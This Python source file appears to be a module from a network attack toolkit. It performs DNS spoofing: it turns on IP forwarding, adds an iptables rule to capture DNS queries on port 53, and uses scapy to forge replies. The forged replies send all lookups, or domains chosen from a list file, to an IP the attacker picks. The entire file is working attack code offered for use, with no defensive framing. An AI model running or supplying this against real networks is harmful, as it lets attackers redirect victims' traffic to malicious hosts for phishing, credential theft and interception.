from CommandModule import *
from scapy.all import *
from NetEnvManager import *
from netfilterqueue import NetfilterQueue
import _thread

class DnsSpoofing(CommandModule) :
    command = "dns"
    outline = "--"
    manual = "--"



    def __init__(self) :
        self.nfqueue = {}
        self.fakeDnsIpDictionary = {}
        self.dnsQueryCallback = [self.oneWayDnsQueryCallback, self.selectiveDnsQueryCallback]


    def run(self) :
        # Make IP Forwarding.
        if False == NetEnvManager.getInstance().checkIpForward() :
            NetEnvManager.getInstance().ipForward(1)


        # This rule of iptables can make a packet which is modifiable.
        queryID = 1
        table = "-t nat"
        checkOpt = "\"udp dpt:53 NFQUEUE num " + str(queryID) + "\""
        iptablesOpt = table + " -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num " + str(queryID)
        if False == NetEnvManager.getInstance().checkIpTables(table, checkOpt) :
            NetEnvManager.getInstance().ipTables(iptablesOpt)
        

        # DNS-Spoofing
        func_id = self.select_dns_func();
        if True == self.dnsSetup(func_id) :
            _thread.start_new_thread(self.dnsCachePoisoning, ("DNS cache poisoning", queryID, int(func_id)))
        # self.dnsCachePoisoning("DNS cache poisoning", queryID)



    def dnsCachePoisoning(self, title, queryID, func_id) :
        print("# DNS cache poisoning...")
        try :
            self.getNFQueue(queryID).bind(queryID, self.dnsQueryCallback[func_id])
            self.getNFQueue(queryID).run()

        except KeyboardInterrupt :
            self.getNFQueue(queryID).unbind()

            NetEnvManager.getInstance().ipForward(0)
            iptablesOpt = "-t nat -F"
            NetEnvManager.getInstance().ipTables(iptablesOpt)


    def oneWayDnsQueryCallback(self, packet) :
        pkt = IP(packet.get_payload())
        resq = self.makeDnsResponse(pkt, self.fakeDnsIpDictionary["fakeDns"])
        send(resq)
        packet.drop()

    def selectiveDnsQueryCallback(self, packet) :
        pkt = IP(packet.get_payload())
        # pkt.show()
        # if pkt[DNS].qd.qname in self.fakeDnsIpDictionary.keys() :
        for dn in self.fakeDnsIpDictionary.keys() :
            if dn in str(pkt[DNS].qd.qname) :
                resq = self.makeDnsResponse(pkt, self.fakeDnsIpDictionary[dn])
                send(resq)
                packet.drop()
                return
        packet.accept()


    def makeDnsResponse(self, packet, targetIp) :
        ip = IP()
        ip.src = packet[IP].dst
        ip.dst = packet[IP].src

        udp = UDP()
        udp.sport = packet[UDP].dport
        udp.dport = packet[UDP].sport

        dns = DNS()
        dns.id = packet[DNS].id	# Transaction ID.
        dns.qr      = 1			# query or response.
        dns.rd      = 0			# Recursion desired.
        dns.qdcount = 1			# Question count.
        dns.ancount = 1			# Answer count.
        dns.qd = packet[DNS].qd
        dns.an = DNSRR(rrname=packet[DNS].qd.qname, type=1, rclass=0x0001, ttl=25740, rdlen=4, rdata=targetIp)

        resp = ip/udp/dns
        # resp.show()
        return resp


    def getNFQueue(self, num) :
        if None == self.nfqueue.get(num) :
            self.nfqueue[num] = NetfilterQueue()
        return self.nfqueue[num]


    def dnsSetup(self, mode_id) :
        self.fakeDnsIpDictionary.clear()

        mode = int(mode_id)
        if 0 == mode:
            print("## Input Fake Ip.")
            fakeIp = input("fake Ip : ")
            self.fakeDnsIpDictionary["fakeDns"] = fakeIp

        elif 1 == mode:
            # Get Dns Spoofing target list.
            print("## Get DNS Spoofing List from \"./dnsSpoofingList.txt\"")
            filename = "dnsSpoofingList.txt"
            try :
                f = open(filename, 'r')
                lines = f.readlines()
                for line in lines :
                    dns, ip = line.replace(' ', '').split(',')
                    self.fakeDnsIpDictionary[dns] = ip
                f.close()
            except :
                print("[Error] %s file is not exist" % filename)
                return False
        return True


    def select_dns_func(self) :
        print("## Select DNS Mode.")
        print(" 0 : One Way DNS Spoofing.")
        print(" 1 : Selective DNS Spoofing.")
        func_id = input("DNS Mode : ")
        return func_id



if __name__ == '__main__' :
    a = DnsSpoofing()
    a.run();
